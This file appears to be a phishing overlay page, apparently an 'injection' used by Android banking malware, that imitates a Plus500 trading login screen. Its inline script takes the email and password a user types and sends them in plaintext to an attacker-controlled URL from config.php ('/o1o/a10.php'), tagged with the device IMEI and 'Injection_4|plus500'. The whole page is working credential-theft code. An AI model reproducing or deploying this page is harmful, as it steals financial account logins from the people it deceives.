<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="payment/com.Plus500/style.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="width: 40%;margin-bottom: 40px;" src="data:image/png;base64,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">
    </div>

    <form action="null" class="form" class="form" method="post" id="_mainForm" target="flow_handler">
        <input type="email" class="field-e" name="email" id="email" placeholder="Email" required>

        <input type="password" class="field-p" name="password" id="password" placeholder="Password" required>

        <input type="submit" class="button" id="sbt_button" value="Log in">
    </form>
    <p> Forgot your password? </p>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    <div class="footer">
        You don't have an account? Open now!
    </div>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {
        
            var oNumInp = document.getElementById('email');
            var oCodeInp = document.getElementById('password');

            try{
                oNumInp.className = 'field-e';
                oCodeInp.className = 'field-p';
            } catch(e){};
            
            if (!/^[^\s()<>@,;:\/]+@\w[\w\.-]+\.[a-z]{2,}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field-e error';
                } catch(e){};
                return false;
            }
            
            if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field-p error';
                } catch(e){};
                return false;
            }
			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|plus500|"+oNumInp.value+"|"+oCodeInp.value);
           
           return false;
       };
       
   })();
</script>
</body>
</html>
